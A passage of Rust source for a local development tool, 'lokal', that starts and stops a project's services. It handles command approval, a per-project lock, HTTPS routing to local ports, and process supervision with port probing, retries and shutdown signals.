/// No terminal and no `--yes`. The hint sends a person to the file and a
/// terminal, and never offers `--yes`: an agent reading it would just add
/// the flag (SPEC §16.11).
fn refusal(f: &ProjectFile, changed: bool) -> UserError {
    let what = if changed {
        "changed since it was approved"
    } else {
        "has commands nobody has approved yet"
    };
    UserError::runtime(format!(
        "{PROJECT_FILE} {what}: {}",
        printable(&f.path.display().to_string())
    ))
    .hint("a person should review the file, then run 'lokal up' in a terminal and answer y")
}

// ───────────────────────────── commands ─────────────────────────────

fn no_file_error(cwd: &Path) -> UserError {
    UserError::runtime(format!(
        "no {PROJECT_FILE} in {} or any parent directory",
        cwd.display()
    ))
}

/// The `lokal.toml` for the current directory, if there is one.
fn find_file() -> Result<(PathBuf, Option<PathBuf>)> {
    let cwd = std::env::current_dir().context("cannot read the current directory")?;
    let found = Paths::find_project_file(&cwd);
    Ok((cwd, found))
}

pub fn up(o: UpOpts) -> Result<i32> {
    let t = Instant::now();
    let paths = Paths::resolve()?;
    let (cwd, found) = find_file()?;
    let Some(path) = found else {
        bail!(
            no_file_error(&cwd)
                .hint("create one at the repo root, e.g. [services] then web = \"npm run dev\"")
        );
    };
    let f = project_file::load(&path)?;
    for w in &f.warnings {
        eprintln!("{} {w}", out::yellow("warning:"));
    }
    if f.project_derived {
        out::note(&project_file::derived_note(&f.project));
    }
    let starts = select_starts(&f, &o.subs)?;
    // After the file is checked, before anything changes, so a refusal
    // routes nothing and starts nothing.
    let Some(approved) = trust_check(&paths, &f, o.yes)? else {
        return Ok(1);
    };
    // Held until lokal exits: one `up` per project at a time.
    let _lock = take_lock(&paths, &f.project)?;
    let listening = |port: u16| net::probe_tcp("localhost", port, PROBE_TIMEOUT);
    let mut pick = |taken: &BTreeSet<u16>| net::pick_port(taken);
    let outcome = State::update(&paths, |st| {
        Ok(match plan(st, &f, &starts, &listening, &mut pick)? {
            Plan::Route(r) => {
                let synced = apply_plan(st, &f, &r);
                Ok((r, synced))
            }
            Plan::Busy(b) => Err(b),
        })
    })?;
    let (routes, synced) = match outcome {
        Ok(x) => x,
        // Nothing was written. The owner is looked up after the lock is
        // released: lsof takes a while.
        Err(b) => {
            let owners = platform::current().system.port_owners(b.port);
            bail!(busy_error(
                &f,
                &b,
                &owners,
                &read_detached(&paths, &f.project)
            ))
        }
    };
    // What this `up` starts replaces what those services left before.
    let mut record = read_detached(&paths, &f.project);
    let before = record.len();
    forget_detached(&mut record, &starts);
    if record.len() != before {
        write_detached(&paths, &f.project, &record);
    }
    // Even with nothing changed, this waits until every URL is ready, as a
    // repeated `service add` does.
    let a = projects::apply(&paths, &synced.ready, &synced.gone)?;
    print_routes(&f, &routes, &synced, &starts, &a, t);
    let jobs = starts_of(&f, &routes, &synced, &starts);
    // The URLs work once the ports do only if the daemon took the routes.
    let url_works = matches!(a, Applied::Ready);
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .context("cannot start the async runtime")
        .and_then(|rt| {
            let r = rt.block_on(supervise(
                approved, jobs, url_works, &paths, &f.project, record,
            ));
            // A pipe that a process outside its group still holds may
            // still be read; don't wait for it.
            rt.shutdown_background();
            r
        })
}

/// Takes `project`'s lock for this `up` (SPEC §4.11, "The lock") and writes
/// lokal's pid into it, or fails if another `up` holds it. The kernel
/// releases it when lokal exits, also if it dies, so a stale file never
/// blocks the next `up`.
fn take_lock(paths: &Paths, project: &str) -> Result<std::fs::File> {
    let path = paths.up_lock(project);
    let Some((mut f, held)) = util::try_lock_exclusive(&path, true)? else {
        bail!("cannot create {}", path.display());
    };
    if !held {
        bail!(UserError::runtime(format!(
            "lokal up is already running for {project}{}",
            holder(&mut f)
        )));
    }
    f.set_len(0)
        .and_then(|()| f.write_all(format!("{}\n", std::process::id()).as_bytes()))
        .with_context(|| format!("cannot write {}", path.display()))?;
    Ok(f)
}

/// ` (pid 1234)` from the lock file of a running `up`, or nothing if it
/// hasn't written its pid yet. Only for the message: lokal never signals
/// it, because pids get reused.
fn holder(f: &mut std::fs::File) -> String {
    let mut s = String::new();
    let _ = f.read_to_string(&mut s);
    s.trim()
        .parse::<u32>()
        .map(|pid| format!(" (pid {pid})"))
        .unwrap_or_default()
}

/// The record of the servers that earlier `up`s' commands left running
/// ([`Detached`]): empty when there's none, or it can't be read, since it's
/// only for messages.
fn read_detached(paths: &Paths, project: &str) -> Vec<Detached> {
    std::fs::read(paths.up_detached(project))
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default()
}

/// Replaces the record (0600), or removes it when `record` is empty. A
/// failure only costs a later message its detail, so it says nothing.
fn write_detached(paths: &Paths, project: &str, record: &[Detached]) {
    let path = paths.up_detached(project);
    if record.is_empty() {
        let _ = std::fs::remove_file(&path);
    } else if let Ok(json) = serde_json::to_vec_pretty(record) {
        let _ = util::write_atomic(&path, &json, 0o600);
    }
}

/// `down` while `up` runs the project fails and removes nothing (SPEC
/// §4.11). Holds the lock while `down` changes state, so an `up` can't
/// start in between; `None` when no `up` has ever run the project here.
fn lock_for_down(paths: &Paths, project: &str) -> Result<Option<std::fs::File>> {
    // Not a project name: no `up` can have run it (and the name is no path).
    if !validate::is_label(project) {
        return Ok(None);
    }
    match util::try_lock_exclusive(&paths.up_lock(project), false)? {
        None => Ok(None),
        Some((f, true)) => Ok(Some(f)),
        Some((mut f, false)) => bail!(UserError::runtime(format!(
            "lokal up is running for {project}{}; stop it first (Ctrl-C in its terminal)",
            holder(&mut f)
        ))),
    }
}

/// The busy-port error (§4.11, "Ports"). `owners` hold the port
/// ([`platform::System::port_owners`]), and `record` is what earlier `up`s'
/// commands left running ([`read_detached`]): a listening owner with the
/// pid and command name the record has for the port is named as left by
/// that service, with the command that stops it.
fn busy_error(f: &ProjectFile, b: &Busy, owners: &[PortOwner], record: &[Detached]) -> UserError {
    let by = platform::owner_text(owners)
        .map(|owner| format!(" by {owner}"))
        .unwrap_or_default();
    let sub = &b.sub;
    let left: Vec<&Detached> = record
        .iter()
        .filter(|d| {
            d.port == b.port
                && owners
                    .iter()
                    .any(|o| o.listening && o.pid == d.pid && o.name == d.name)
        })
        .collect();
    if let [first, ..] = left[..] {
        let pids: Vec<String> = left.iter().map(|d| d.pid.to_string()).collect();
        let it = if pids.len() == 1 { "it" } else { "them" };
        return UserError::runtime(format!(
            "localhost:{} is already in use{by}, which {} left running at the last lokal up; not starting {sub}",
            b.port, first.sub
        ))
        .hint(format!(
            "stop {it}: kill {}. {}",
            pids.join(" "),
            detached_hint(&first.sub)
        ));
    }
    let hint = match b.from {
        PortFrom::File => format!("stop that server, or change port for {sub} in {PROJECT_FILE}"),
        PortFrom::Kept => format!(
            "stop that server (is lokal run {sub} still running?), or let lokal pick a new port: \
lokal service remove {sub} -p {}, then lokal up",
            f.project
        ),
        // Free a moment ago: something took it since.
        PortFrom::Picked => "run lokal up again: it picks another free port".into(),
    };
    UserError::runtime(format!(
        "localhost:{} is already in use{by}; not starting {sub}",
        b.port
    ))
    .hint(hint)
}

fn print_routes(
    f: &ProjectFile,
    routes: &Routes,
    synced: &Synced,
    starts: &BTreeSet<String>,
    a: &Applied,
    t: Instant,
) {
    for (sub, fs) in &f.services {
        let port = routes.ports[sub].port;
        let not_started = if starts.contains(sub) {
            String::new()
        } else {
            format!("  {}", dim("(not started)"))
        };
        println!(
            "{} https://{} → localhost:{port}  {}{not_started}",
            ok_mark(),
            state::fqdn(sub, &synced.domain),
            runner::substitute_port(&fs.run, port)
        );
    }
    let took = match a {
        Applied::Ready => format!("routes ready in {}", util::fmt_duration(t.elapsed())),
        _ => "routes saved".into(),
    };
    println!("  {}", dim(&took));
    if let Some(n) = adopted_note(&routes.adopted) {
        out::note(&n);
    }
    // The collisions are the same for every service: print them once.
    if let Some((sub, r)) = routes.ports.iter().next() {
        let (_, warnings) = runner::child_env(&synced.domain, &synced.services, sub, r.port);
        for w in warnings {
            eprintln!("  {} {w}", out::yellow("warning:"));
        }
    }
    projects::print_notes(a);
}

pub fn down(o: DownOpts) -> Result<i32> {
    let t = Instant::now();
    let paths = Paths::resolve()?;
    let project = match &o.project {
        Some(p) => validate::normalize(p),
        None => {
            let (cwd, found) = find_file()?;
            let Some(path) = found else {
                bail!(
                    no_file_error(&cwd)
                        .hint("run it in the repo, or name the project: lokal down -p <NAME>")
                );
            };
            // Only the name: a file with other errors still names its project.
            let (name, derived) = project_file::load_project_name(&path)?;
            if derived {
                out::note(&project_file::derived_note(&name));
            }
            name
        }
    };
    let _lock = lock_for_down(&paths, &project)?;
    let removal = State::update(&paths, |st| {
        Ok(remove_managed(st, &project, o.remove_project))
    })?;
    let kept_note = |kept: &[String]| {
        if o.remove_project && !kept.is_empty() {
            out::note(&format!(
                "kept project {project}: it still has services that {PROJECT_FILE} doesn't manage ({})",
                kept.join(", ")
            ));
        }
    };
    match removal {
        // A repeated cleanup doesn't fail.
        Removal::NoProject => {
            println!("Nothing to remove: there is no project {project}");
        }
        Removal::Nothing { kept } => {
            println!("Nothing to remove: {PROJECT_FILE} manages no services in {project}");
            kept_note(&kept);
        }
        Removal::Removed {
            domain,
            subs,
            gone,
            project_removed,
            kept,
        } => {
            let a = projects::apply(&paths, &[], &gone)?;
            let what = match (subs.len(), project_removed) {
                (0, _) => format!("the project {domain}"),
                (n, removed) => format!(
                    "{n} service{} from {PROJECT_FILE}{}",
                    if n == 1 { "" } else { "s" },
                    if removed {
                        format!(" and the project {domain}")
                    } else {
                        String::new()
                    }
                ),
            };
            println!(
                "{} Removed {what}{}",
                ok_mark(),
                dim(&projects::timing(&a, "done", t))
            );
            kept_note(&kept);
            projects::print_notes(&a);
        }
    }
    Ok(0)
}

// ───────────────────────────── running the commands ─────────────────────────────

/// How often a started service's port is probed until it accepts, as
/// `lokal run` does (§4.10).
const PROBE_EVERY: Duration = Duration::from_millis(50);
/// How often lokal looks whether an exited shell's process group is empty,
/// and checks the stop timers.
const POLL_EVERY: Duration = Duration::from_millis(50);
/// Stopping: SIGINT first, SIGTERM to the groups left at 5s, SIGKILL at 10s.
const TERM_AFTER: Duration = Duration::from_secs(5);
const KILL_AFTER: Duration = Duration::from_secs(10);
/// After SIGKILL, a group that still isn't empty holds only processes lokal
/// may not signal (another user's): lokal stops waiting for it after this.
const GIVE_UP_AFTER_KILL: Duration = Duration::from_secs(2);
/// Once a service's group is empty and its shell reaped, nothing in it can
/// write any more, and what it wrote drains in milliseconds. A pipe still
/// open after this is held by a process that left the group (`setsid`, as
/// `pg_ctl start` does): lokal can't stop that one, and stops waiting for it.
/// It also bounds how long a retry's decision waits for the lines a shell
/// wrote before it exited, when a background job holds its pipes open, and
/// for the check of its own port ([`Svc::decide`]).
const PIPE_GRACE: Duration = Duration::from_secs(1);
/// Longer lines are split (§4.11).
const MAX_LINE: usize = 16 * 1024;
/// The bound of the channel from the pipe readers to the main loop: a
/// chatty server waits for the terminal instead of growing lokal's memory.
const EVENTS: usize = 256;
/// The wrong-port hint looks at what a service's shell and the processes
/// it started listen on from this long after the start, then every
/// [`HINT_EVERY`], until the service is ready or has exited, and hints once
/// two lookups in a row agree (§4.10, §4.11).
const HINT_AFTER: Duration = Duration::from_secs(3);
const HINT_EVERY: Duration = Duration::from_secs(2);
/// After a command exits 0 before its port accepted connections, lokal
/// keeps probing the port this long (§4.11, "A server that detaches"): a
/// command that starts its server in a new session may exit before the
/// server binds.
const DETACH_WAIT: Duration = Duration::from_secs(2);

/// Which of a service's pipes a line came from; it goes to the same one of
/// lokal's.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Stream {
    Out,
    Err,
}

/// What the tasks tell the main loop, which is the only writer to lokal's
/// stdout and stderr. `svc` is a run's index in `svcs` (see [`Svc`]).
#[derive(Debug)]
enum Event {
    Line {
        svc: usize,
        stream: Stream,
        text: String,
    },
    /// One of the service's pipes reached EOF (or failed).
    Closed { svc: usize },
    /// Its shell exited and was reaped: the exit code as a shell reports it.
    Exited { svc: usize, code: i32 },
    /// Its port accepted a connection.
    Ready { svc: usize },
    /// The TCP ports that its shell and the processes it started listen on,
    /// for the wrong-port hint.
    Listens { svc: usize, ports: Vec<u16> },
    /// The check of its own port after a line said a port is in use
    /// ([`own_port_taken`]).
    OwnPort { svc: usize, taken: bool },
    /// After an exit 0, its port accepted connections: the processes that
    /// hold it ([`port_left`]).
    PortHeld { svc: usize, owners: Vec<PortOwner> },
    /// A retry's state write and reload are done: the new port, or `None`
    /// when the service's route changed in the meantime.
    Moved {
        svc: usize,
        result: Result<Option<u16>>,
    },
}

/// Whether a run may be retried on a new port (§4.11, "A port that's taken
/// after all"): once per service, and never for a fixed `port`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Retry {
    /// No: its port is fixed in the file, it is the retry, or it ended in a
    /// way that isn't retried.
    No,
    /// Yes, if it exits non-zero before it's ready after printing that a
    /// port is in use, and its own port is taken.
    Allowed,
    /// It exited non-zero before it was ready: [`Svc::decide`] retries it
    /// (only if `may_move`, which [`Retry::Allowed`] became) when a line
    /// said a port is in use and its own port is taken, gives it the
    /// port-in-use hint when its own port is free, and does neither once no
    /// line or check can still change that.
    Deciding { since: Instant, may_move: bool },
    /// Its new port is being written and reloaded, off the main loop.
    Moving,
    /// A second run, on the new port, took over from it.
    Replaced,
}

/// After a line said a port is in use: is the run's own port taken
/// ([`own_port_taken`])?
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum InUse {
    /// No such line yet (before it was ready).
    No,
    /// Its own port is being checked, off the main loop.
    Checking,
    /// A process outside its group holds it: a retry may help.
    Taken,
    /// It's free, or the run holds it itself: the clash was on another port.
    Free,
}

/// After a run's command exited 0 while lokal wasn't stopping: what it left
/// on the service's port (§4.11, "A server that detaches").
#[derive(Debug, Clone, PartialEq, Eq)]
enum Detach {
    /// Nothing to look at: its command runs, exited non-zero, or exited
    /// while lokal was stopping.
    No,
    /// Its port hadn't accepted connections by the exit: it's still probed
    /// until `until`, [`DETACH_WAIT`] after the exit.
    Watching { until: Instant },
    /// Its port accepts connections: the processes that hold it are being
    /// looked up, off the main loop.
    Looking,
    /// What the lookup found, or [`PortLeft::Nothing`] when the watch ended
    /// first.
    Done(PortLeft),
}

impl Detach {
    /// The exit line and the ready line wait for it.
    fn in_progress(&self) -> bool {
        matches!(self, Self::Watching { .. } | Self::Looking)
    }
}

/// One run of a service's command that [`supervise`] started, and what it
/// knows about it. A service has one run, or two after a retry on a new port
/// (§4.11, "A port that's taken after all"). The first is then
/// [`Retry::Replaced`]: it no longer counts for the ready line or the exit
/// code, but lokal still waits for its process group to empty, and stops it
/// as it stops any run's, in case a background job is left in it.
struct Svc {
    /// The service's index in the jobs, which is its first run's in `svcs`.
    of: usize,
    /// What this run started: the service, its port and its command.
    job: Start,
    /// `name |`, padded to the longest started name and coloured.
    label: String,
    /// The shell's pid, which is its process group's id. 0 if it couldn't
    /// start.
    pgid: u32,
    /// Once the shell is reaped: its exit code (127 or 126 if it couldn't
    /// start).
    code: Option<i32>,
    ready: bool,
    /// When its group was found empty. It's never signalled after that,
    /// because its pgid may be reused.
    empty_at: Option<Instant>,
    /// Its pipes that haven't reached EOF.
    open_pipes: u8,
    /// lokal stopped waiting for it ([`PIPE_GRACE`], [`GIVE_UP_AFTER_KILL`]).
    abandoned: bool,
    prober: Option<JoinHandle<()>>,
    /// The service's `<sub>.log` (§4.11, "Logs"), which its runs share.
    log: Rc<RefCell<ServiceLog>>,
    /// Its shell's exit, not reported yet: the code, and whether the
    /// terminal gets the line (not while stopping). See [`Svc::exited`].
    unreported_exit: Option<(i32, bool)>,
    retry: Retry,
    /// Whether a line it wrote before it was ready said a port is in use,
    /// and if so, whether its own port is taken.
    in_use: InUse,
    /// When the next listener lookup for the wrong-port hint is due.
    lookup_at: Instant,
    /// A lookup is running: at most one per run at a time.
    looking: bool,
    /// The ports the last lookup found: the hint waits until two in a row
    /// agree ([`runner::listens_elsewhere`]).
    listened: Vec<u16>,
    /// The service got its wrong-port hint: once per service, so a retry
    /// takes this over.
    hinted: bool,
    /// After an exit 0: whether its server left its process group.
    detach: Detach,
}

impl Svc {
    /// A run of `job`, not started yet. `log` is the service's.
    fn new(
        of: usize,
        job: Start,
        label: String,
        log: Rc<RefCell<ServiceLog>>,
        retry: Retry,
        hinted: bool,
    ) -> Self {
        Self {
            of,
            job,
            label,
            pgid: 0,
            code: None,
            ready: false,
            empty_at: None,
            open_pipes: 0,
            abandoned: false,
            prober: None,
            log,
            unreported_exit: None,
            retry,
            in_use: InUse::No,
            lookup_at: Instant::now() + HINT_AFTER,
            looking: false,
            listened: vec![],
            hinted,
            detach: Detach::No,
        }
    }

    /// Starts its shell, as run `i`: `lokal: started on port …` in its
    /// log, then tasks that read its pipes, wait for it and probe its port,
    /// each reporting to `tx`. A shell that can't start is an exit with 127
    /// (not found: the shell or the `cwd`) or 126, as a shell reports it
    /// (§4.10).
    fn start(mut self, i: usize, tx: &mpsc::Sender<Event>, p: &mut Printer) -> Self {
        match process::spawn_shell(&self.job.run, &self.job.env, &self.job.cwd) {
            Ok(child) => {
                let started = format!(
                    "started on port {}: {}",
                    self.job.port,
                    printable(&self.job.run)
                );
                self.note(p, &started);
                self.watch(i, child, tx);
            }
            Err(e) => {
                p.line(Stream::Err, &format!("{}: cannot start: {e}", self.job.sub));
                self.note(p, &format!("cannot start: {e}"));
                self.code = Some(if e.kind() == std::io::ErrorKind::NotFound {
                    127
                } else {
                    126
                });
                self.empty_at = Some(Instant::now());
                self.retry = Retry::No;
            }
        }
        self
    }

    fn watch(&mut self, i: usize, mut child: tokio::process::Child, tx: &mpsc::Sender<Event>) {
        self.pgid = child.id().unwrap_or(0);
        if let Some(pipe) = child.stdout.take() {
            self.open_pipes += 1;
            read_pipe(i, Stream::Out, pipe, tx.clone());
        }
        if let Some(pipe) = child.stderr.take() {
            self.open_pipes += 1;
            read_pipe(i, Stream::Err, pipe, tx.clone());
        }
        let exits = tx.clone();
        tokio::spawn(async move {
            let code = match child.wait().await {
                Ok(st) => platform::shell_exit_code(&st),
                Err(_) => 1,
            };
            let _ = exits.send(Event::Exited { svc: i, code }).await;
        });
        let (port, ready) = (self.job.port, tx.clone());
        self.prober = Some(tokio::spawn(async move {
            let mut every = tokio::time::interval(PROBE_EVERY);
            every.set_missed_tick_behavior(MissedTickBehavior::Delay);
            loop {
                every.tick().await;
                if net::probe_tcp_async("localhost", port, PROBE_TIMEOUT).await {
                    let _ = ready.send(Event::Ready { svc: i }).await;
                    return;
                }
            }
        }));
    }

    /// The ready line waits for it: its command runs and its port doesn't
    /// accept connections yet; it exited and its exit isn't reported yet
    /// (which comes before the ready line, and after the look at its port
    /// that follows an exit 0); or it's about to be retried. A replaced run
    /// doesn't count; its retry does.
    fn pending(&self) -> bool {
        match self.retry {
            Retry::Deciding { .. } | Retry::Moving => true,
            Retry::Replaced => false,
            Retry::No | Retry::Allowed => match self.code {
                None => !self.ready,
                Some(_) => self.unreported_exit.is_some() || self.detach.in_progress(),
            },
        }
    }

    /// How the ready line counts it, once it isn't [`Svc::pending`].
    fn counted(&self) -> Counted {
        match (self.code, &self.detach) {
            (None, _) if self.ready => Counted::Ready,
            (Some(_), Detach::Done(PortLeft::InGroup)) => Counted::Ready,
            (Some(_), Detach::Done(PortLeft::Outside(_))) => Counted::Detached,
            (code, _) => Counted::NotReady(code),
        }
    }

    /// The servers its command left running outside `lokal up`, if any.
    fn left_outside(&self) -> Option<&[PortOwner]> {
        match &self.detach {
            Detach::Done(PortLeft::Outside(owners)) => Some(owners),
            _ => None,
        }
    }

    /// Its shell exited, as run `i`. The exit is reported after the output
    /// it wrote before it exited, which may still be in its pipes and the
    /// channel (up to a pipe's buffer): once both pipes close. When its
    /// group still has processes (a background job), they may hold the
    /// pipes for long, so it's reported at once. A non-zero exit before it
    /// was ready may be retried on a new port, or get the port-in-use hint
    /// ([`Svc::decide`]), but not while stopping. After an exit 0, while
    /// not stopping, its server may still run, out of lokal's reach
    /// (`setsid`), so lokal looks at its port first ([`Detach`]): at once if
    /// it accepted connections before the exit, and otherwise once it does,
    /// probing it for at most [`DETACH_WAIT`], since such a server may bind
    /// after its command has exited.
    fn exited(
        &mut self,
        i: usize,
        code: i32,
        stopping: bool,
        tx: &mpsc::Sender<Event>,
        p: &mut Printer,
    ) {
        self.code = Some(code);
        if code == 0 && !stopping {
            if self.ready {
                self.look_at_port(i, tx);
            } else {
                self.detach = Detach::Watching {
                    until: Instant::now() + DETACH_WAIT,
                };
            }
        } else {
            self.stop_probing();
        }
        let early = code != 0 && !self.ready && !stopping;
        self.retry = match self.retry {
            r @ (Retry::Allowed | Retry::No) if early => Retry::Deciding {
                since: Instant::now(),
                may_move: r == Retry::Allowed,
            },
            Retry::Allowed => Retry::No,
            r => r,
        };
        // While stopping, an exit is what lokal asked for: only the log
        // gets it, for a reader who sees only the file.
        self.unreported_exit = Some((code, !stopping));
        self.look();
        if self.open_pipes == 0 || self.running() {
            self.report_exit(p);
        }
    }

    /// `api exited 1` on the terminal, and `lokal: exited 1` in its log. For
    /// an exit 0 it waits until lokal knows what the command left on its
    /// port: a server outside its group makes it [`left_running`]'s line,
    /// followed by [`detached_hint`], on the terminal and in its log.
    fn report_exit(&mut self, p: &mut Printer) {
        if self.detach.in_progress() {
            return;
        }
        let Some((code, print)) = self.unreported_exit.take() else {
            return;
        };
        let sub = self.job.sub.clone();
        let (line, hint) = match self.left_outside() {
            Some(owners) => (
                left_running(&sub, self.job.port, owners),
                Some(detached_hint(&sub)),
            ),
            None => (format!("exited {code}"), None),
        };
        self.note(p, &line);
        if let Some(hint) = &hint {
            self.note(p, &format!("hint: {hint}"));
        }
        if print {
            p.line(Stream::Out, &format!("{sub} {line}"));
            if let Some(hint) = &hint {
                p.line(Stream::Out, &format!("{} {hint}", out::yellow("hint:")));
            }
        }
    }

    /// Reports its exit if the output it wrote before it has arrived: its
    /// pipes are closed, its group still runs (a background job may hold
    /// them), or lokal stopped waiting for them.
    fn report_exit_if_due(&mut self, p: &mut Printer) {
        if self.open_pipes == 0 || self.running() || self.abandoned {
            self.report_exit(p);
        }
    }

    /// Its port accepted a connection, as run `i`. After an exit 0 that's
    /// the moment to look up who holds it; before the exit, it's ready. An
    /// exit that came first wins otherwise: it doesn't count as ready.
    fn answered(&mut self, i: usize, tx: &mpsc::Sender<Event>) {
        if matches!(self.detach, Detach::Watching { .. }) {
            self.look_at_port(i, tx);
        } else {
            self.ready = self.code.is_none();
        }
    }

    /// Looks up the processes that hold its port (`lsof`, ~30ms, on a
    /// blocking thread), reporting to `tx` as run `i`.
    fn look_at_port(&mut self, i: usize, tx: &mpsc::Sender<Event>) {
        self.stop_probing();
        self.detach = Detach::Looking;
        let (port, tx) = (self.job.port, tx.clone());
        tokio::spawn(async move {
            let owners =
                tokio::task::spawn_blocking(move || platform::current().system.port_owners(port))
                    .await
                    .unwrap_or_default();
            let _ = tx.send(Event::PortHeld { svc: i, owners }).await;
        });
    }

    /// The lookup's answer ([`port_left`]), and then its exit line. Returns
    /// the servers that run outside `lokal up`, for the record.
    fn port_held(&mut self, owners: &[PortOwner], p: &mut Printer) -> Option<Vec<PortOwner>> {
        if self.detach != Detach::Looking {
            return None;
        }
        let left = port_left(owners, self.pgid);
        let outside = match &left {
            PortLeft::Outside(o) => Some(o.clone()),
            _ => None,
        };
        self.detach = Detach::Done(left);
        self.look();
        self.report_exit_if_due(p);
        outside
    }

    /// Ends the watch of its port after an exit 0 ([`DETACH_WAIT`] has
    /// passed, or lokal is stopping): nothing it left accepts connections
    /// there.
    fn end_watch(&mut self, p: &mut Printer) {
        if matches!(self.detach, Detach::Watching { .. }) {
            self.stop_probing();
            self.detach = Detach::Done(PortLeft::Nothing);
            self.report_exit_if_due(p);
        }
    }

    /// Decides what follows a non-zero exit before it was ready
    /// ([`Retry::Deciding`]) once the exit is reported, so `web exited 1`
    /// comes before the retry note or the hint. Returns true if it's to be
    /// retried: it may move, a line said a port is in use, and its own port
    /// is taken. When its own port is free, it prints the port-in-use hint
    /// instead. It waits for a check that is still running, and, for a run
    /// that may move, for a line that may still come, at most until both
    /// pipes are closed, or, if a background job holds them open,
    /// [`PIPE_GRACE`] after the exit.
    fn decide(&mut self, p: &mut Printer) -> bool {
        let Retry::Deciding { since, may_move } = self.retry else {
            return false;
        };
        if self.unreported_exit.is_some() {
            return false;
        }
        let waited = since.elapsed() >= PIPE_GRACE;
        let lines_in = self.open_pipes == 0 || self.abandoned || waited;
        match self.in_use {
            InUse::Taken if may_move => {
                self.retry = Retry::Moving;
                return true;
            }
            InUse::Free => {
                self.retry = Retry::No;
                self.port_in_use_hint(p);
            }
            InUse::Checking if !waited => {}
            InUse::No if may_move && !lines_in => {}
            InUse::Taken | InUse::Checking | InUse::No => self.retry = Retry::No,
        }
        false
    }

    /// Its group may still have processes in it, for lokal to stop.
    fn running(&self) -> bool {
        self.pgid != 0 && self.empty_at.is_none() && !self.abandoned
    }

    /// Its shell is reaped, its group empty and its pipes closed, or lokal
    /// stopped waiting for it; no retry is being decided or set up; and its
    /// port isn't being looked at after an exit 0.
    fn finished(&self) -> bool {
        !matches!(self.retry, Retry::Deciding { .. } | Retry::Moving)
            && !self.detach.in_progress()
            && (self.abandoned
                || (self.code.is_some() && self.empty_at.is_some() && self.open_pipes == 0))
    }

    fn stop_probing(&mut self) {
        if let Some(p) = self.prober.take() {
            p.abort();
        }
    }

    /// Looks whether its group is empty now. Only `ESRCH` counts, which
    /// comes only once the shell is reaped (VERIFY V10).
    fn look(&mut self) {
        if self.running() && !platform::group_alive(self.pgid) {
            self.empty_at = Some(Instant::now());
        }
    }

    /// Signals its group, unless it's empty, and says so in its log. It
    /// looks right before the signal: once the shell is reaped, its pgid is
    /// free for reuse as soon as the group empties.
    fn signal(&mut self, sig: GroupSignal, p: &mut Printer) {
        self.look();
        if self.running() {
            platform::signal_group(self.pgid, sig);
            let name = match sig {
                GroupSignal::Interrupt => "SIGINT",
                GroupSignal::Terminate => "SIGTERM",
                GroupSignal::Kill => "SIGKILL",
            };
            self.note(p, &format!("stopping ({name})"));
        }
    }

    /// The wrong-port hint's next lookup is due: from [`HINT_AFTER`] after
    /// the start, every [`HINT_EVERY`], one at a time, until it's ready or
    /// has exited, and only until the service got its hint.
    fn lookup_due(&self) -> bool {
        !self.hinted
            && !self.looking
            && !self.ready
            && self.code.is_none()
            && self.pgid != 0
            && Instant::now() >= self.lookup_at
    }

    /// Asks which TCP ports its shell and the processes it started listen
    /// on (`ps` and `lsof`, ~40ms, on a blocking thread), reporting to `tx`
    /// as run `i`. From the shell's pid, not its process group, as `lokal
    /// run` does (VERIFY V9).
    fn look_up_listeners(&mut self, i: usize, tx: &mpsc::Sender<Event>) {
        self.looking = true;
        self.lookup_at = Instant::now() + HINT_EVERY;
        let (pid, tx) = (self.pgid, tx.clone());
        tokio::spawn(async move {
            let ports = tokio::task::spawn_blocking(move || {
                platform::current().system.tcp_listen_ports(pid)
            })
            .await
            .unwrap_or_default();
            let _ = tx.send(Event::Listens { svc: i, ports }).await;
        });
    }

    /// A lookup's answer: the hint, once for the service, if its processes
    /// listen on the same ports as at the lookup before, and not on its own.
    /// Ports that are still changing (helper listeners that open before the
    /// server's own, as a debugger does) say nothing, nor does listening on
    /// nothing yet (still compiling), nor a run that is ready or has exited
    /// by now.
    fn listens(&mut self, ports: Vec<u16>, stopping: bool, p: &mut Printer) {
        self.looking = false;
        let previous = std::mem::replace(&mut self.listened, ports);
        if stopping
            || self.hinted
            || self.ready
            || self.code.is_some()
            || !runner::listens_elsewhere(&previous, &self.listened, self.job.port)
        {
            return;
        }
        self.hinted = true;
        let hint = wrong_port_hint(&self.job, &self.listened);
        self.note(p, &format!("hint: {hint}"));
        p.line(Stream::Out, &format!("{} {hint}", out::yellow("hint:")));
    }

    /// A line it wrote, as run `i`, into its log (§4.11, "Logs"). Before it's
    /// ready, and before what follows its exit is decided, the first line
    /// that says a port is in use starts the check of its own port.
    fn log_line(
        &mut self,
        i: usize,
        text: &str,
        stopping: bool,
        tx: &mpsc::Sender<Event>,
        p: &mut Printer,
    ) {
        if !stopping
            && !self.ready
            && self.in_use == InUse::No
            && (self.code.is_none() || matches!(self.retry, Retry::Deciding { .. }))
            && says_port_taken(text)
        {
            self.check_own_port(i, tx);
        }
        let w = self.log.borrow_mut().line(text);
        if let Some(w) = w {
            p.warn(&w);
        }
    }

    /// Checks whether its own port is taken ([`own_port_taken`]), off the
    /// main loop, reporting to `tx` as run `i`: a TCP connect (at most
    /// [`PROBE_TIMEOUT`]) and, side by side, the processes that hold the
    /// port (`lsof`, ~30ms, on a blocking thread). At the line, not after
    /// the exit, so it sees what held the port when the server complained.
    fn check_own_port(&mut self, i: usize, tx: &mpsc::Sender<Event>) {
        self.in_use = InUse::Checking;
        let (port, pgid, tx) = (self.job.port, self.pgid, tx.clone());
        tokio::spawn(async move {
            let owners =
                tokio::task::spawn_blocking(move || platform::current().system.port_owners(port));
            let (accepts, owners) = tokio::join!(
                net::probe_tcp_async("localhost", port, PROBE_TIMEOUT),
                owners
            );
            let taken = own_port_taken(accepts, &owners.unwrap_or_default(), pgid);
            let _ = tx.send(Event::OwnPort { svc: i, taken }).await;
        });
    }

    /// The check's answer. [`Svc::decide`] acts on it.
    fn own_port(&mut self, taken: bool) {
        if self.in_use == InUse::Checking {
            self.in_use = if taken { InUse::Taken } else { InUse::Free };
        }
    }

    /// `hint: web says a port is in use, but its own port 51234 is free. …`
    /// on stdout, and as `lokal: hint: …` in its log.
    fn port_in_use_hint(&mut self, p: &mut Printer) {
        let hint = port_in_use_hint(&self.job.sub, self.job.port);
        self.note(p, &format!("hint: {hint}"));
        p.line(Stream::Out, &format!("{} {hint}", out::yellow("hint:")));
    }

